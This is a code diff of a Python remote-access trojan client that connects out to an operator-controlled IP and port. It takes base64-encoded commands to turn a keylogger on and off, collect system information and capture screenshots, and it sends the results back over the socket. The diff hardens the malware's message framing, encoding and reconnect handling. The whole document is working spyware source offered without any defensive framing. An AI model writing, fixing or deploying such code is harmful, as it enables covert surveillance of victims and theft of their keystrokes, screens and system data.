@@ -11,9 +11,17 @@ class CLIENT:
 
     def send_data(self, tosend, encode=True):
         if encode:
+            if isinstance(tosend, bytes):
+                tosend = tosend.decode('utf-8', errors='ignore') 
             self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
+
         else:
+            if isinstance(tosend, str):
+                tosend = tosend.encode('utf-8')
             self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
+
+
+
 
     def turn_keylogger(self, status):
         if HAVE_X:
@@ -68,7 +76,7 @@ class CLIENT:
 
         elif data[0] == "keylogger" and HAVE_X:
 
-            #print("Executing Keylogger: " + data[1])
+            # print("Executing Keylogger: " + data[1])
             if data[1] == "on":
                 self.turn_keylogger(True)
                 self.send_data("")
@@ -80,32 +88,50 @@ class CLIENT:
 
         elif data[0] == "sysinfo":
 
-            #print("Executing Sysinfo: " + data[1])
+            # print("Executing Sysinfo: " + data[1])
             sysinfo = SYSINFO()
             self.send_data(sysinfo.get_data())
 
         elif data[0] == "screenshot":
 
-            #print("Executing Screenshot: " + data[1])
+            # print("Executing Screenshot: " + data[1])
             screenshot = SCREENSHOT()
             self.send_data(screenshot.get_data(), encode=False)
 
     def acceptor(self):
-        data = ""
-        chunk = b""
+        data = b"" 
 
         while True:
-            chunk = self.SOCK.recv(4096)
-            if not chunk:
-                break
-            data += chunk.decode('utf-8')
+            try:
+                chunk = self.SOCK.recv(4096)
+                if not chunk:
+                    print("[!] Connection closed by remote host.")
+                    break
 
-            if self.KEY.encode('utf-8') in chunk:
-                data = data.rstrip(self.KEY)
-                t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
-                t.daemon = True
-                t.start()
-                data = ""
+                data += chunk
+
+                if self.KEY.encode('utf-8') in data:
+                    parts = data.split(self.KEY.encode('utf-8'))
+                    payload = parts[0] 
+                    try:
+                        decoded = base64.decodebytes(payload)
+                        t = threading.Thread(target=self.execute, args=(decoded,))
+                        t.daemon = True
+                        t.start()
+                    except Exception as e:
+                        print(f"[!] Failed to decode or execute: {e}")
+                    data = b""
+
+            except ConnectionResetError:
+                print("[!] Connection forcibly closed by remote host (WinError 10054).")
+                break
+            except Exception as e:
+                print(f"[!] Unexpected error in acceptor: {e}")
+                break
+            except KeyboardInterrupt:
+                print("[!] Keyboard interrupt received, closing connection.")
+                break
+
 
     def engage(self):
         self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -114,9 +140,12 @@ class CLIENT:
             try:
                 # print("Connecting To: %s:%d" % (self.ipaddress, self.port))
                 self.SOCK.connect((self.ipaddress, self.port))
-            except:
-                # print("Failed to Connect. Trying Again!")
+                self.acceptor()
+            except ConnectionRefusedError:
+                print("[!] Connection refused, retrying in 5 seconds...")
                 time.sleep(5)
                 continue
+            except Exception as e:
+                print(f"[!] Unexpected error in engage: {e}")
+                pass
 
-            self.acceptor()
